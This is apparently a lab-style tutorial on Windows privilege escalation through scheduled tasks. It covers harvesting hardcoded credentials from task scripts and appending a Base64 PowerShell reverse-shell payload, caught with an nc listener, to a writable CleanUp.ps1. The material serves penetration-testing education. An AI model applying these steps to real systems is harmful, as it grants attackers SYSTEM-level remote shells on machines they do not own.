## **Windows Privilege Escalation: Scheduled Tasks** 

This guide covers Windows Privilege Escalation (PrivEsc) by targeting scheduled tasks. It contrasts them with services and outlines two primary vectors for escalating from a standard user to `SYSTEM` or `Administrator` . 

## **Understanding Scheduled Tasks** 

- **Scheduled Task:** A mechanism to execute specific processes or commands at predefined intervals or times. They are the Windows equivalent of Linux **Cron Jobs** . 

   - **Behavior:** Designed to run a job and then terminate. They do not monitor the process status after execution. 

- **Windows Services:** Designed for persistent, long-running background processes. They can be monitored, logged, and configured to auto-restart if they crash. They do not support interval-based scheduling (e.g., "every 1 minute"). 

## **Setting Up the Environment** 

To connect to a target via RDP from the terminal, use `xfreerdp` : 

- **Command:** `xfreerdp /u:user /p:password321 /cert:ignore /v:<Target_IP> /smart-sizing` 

- **Note:** The `/smart-sizing` flag is essential for ensuring the RDP window dynamically resizes to your display. 

## **Technique 1: Sensitive Information Extraction** 

This method focuses on identifying insecurely configured tasks that contain hardcoded credentials. 

1. **Enumeration:** List all tasks and filter out default Microsoft processes. 

   - **Command:** `schtasks /query /fo LIST | findstr /i TaskName | findstr /i /v "microsoft"` 

   - _Note:_ `/i` ignores case; `/v` performs an inverse search. 

2. **Investigation:** Query a suspicious task (e.g., "SaveCred") for verbose output. 

   - **Command:** `schtasks /query /tn SaveCred /fo list /v` 

   - _Result:_ Often reveals a path to a `.bat` file (e.g., `C:\PrivEsc\savecred.bat` ). 

3. **Exploitation:** Read the script. If it contains `runas` commands with hardcoded credentials, use them to spawn an administrative shell. 

   - **Command:** `runas /user:admin cmd.exe` 

## **Technique 2: Misconfigured File Permissions** 

This method involves modifying scripts that run periodically in the background to include a reverse shell. 

1. **Discovery:** Locate non-standard scripts that perform automated maintenance, such as `CleanUp.ps1` . 

2. **Permission Checking:** Confirm you have write access to the script. `o` **icacls:** `icacls CleanUp.ps1` (Check for `(M)` - Modify or `(F)` - Full Access). 

   - **accesschk:** `accesschk.exe -accepteula -q -u user CleanUp.ps1` (Use `-accepteula` to bypass GUI prompts). 

   - **Echo Method:** `echo hello >> CleanUp.ps1` (If it executes without error, you have write permissions). 

3. **Interval Verification:** Verify the task's execution frequency by injecting a command to create a test file. 

   - **Command:** `echo echo "hello" ^> C:\Users\user\test.txt >> CleanUp.ps1` 

   - _Note:_ The `^` is a Windows escape character used to prevent the `>` operator from executing in your current shell. 

4. **Exploitation via Reverse Shell:** 

   - Generate a Base64-encoded PowerShell payload from revshells.com. 

   - Start a listener: `nc -nvlp 4444` . 

   - Append the payload: `echo <base64_payload> >> CleanUp.ps1` . 

## **Essential Commands & Tools** 

|**Command/Tool**|**Purpose**|**Notes**|
|---|---|---|
|`schtasks`|Manage scheduled tasks|Use`/query`to list and`/tn`to specify<br>tasks.|
|`findstr`|Search text in command<br>output|Windows equivalent of`grep`.|
|`runas`|Run commands as<br>another user|Similar to`sudo`or`su`.|
|`icacls`|View/modify file<br>permissions|`M`= Modify,`F`= Full Access.|
|`accesschk.exe`|Verify permissions|Use`-accepteula`to skip prompts.|
|`nc`|Netcat listener|Used to catch reverse shells.|
|`^`(Caret)|Escape character|Prevents immediate execution of|



|**Command/Tool**|**Purpose**|**Notes**|
|---|---|---|
|||special characters.|



## **Key Takeaways** 

- **Distinct Roles:** Scheduled tasks execute and exit; services maintain persistent state. 

- **Enumeration:** Use `schtasks` combined with `findstr` to isolate custom tasks from default Windows tasks. 

- **Credential Exposure:** Hardcoded credentials in scripts triggered by tasks provide the fastest route to `SYSTEM` . 

- **Practical Checks:** Always attempt a simple `echo` redirection to verify write permissions before moving to more complex tools. 

- **Escape Character:** In Windows CMD, use the caret ( `^` ) to escape characters like `>` when writing to scripts. 

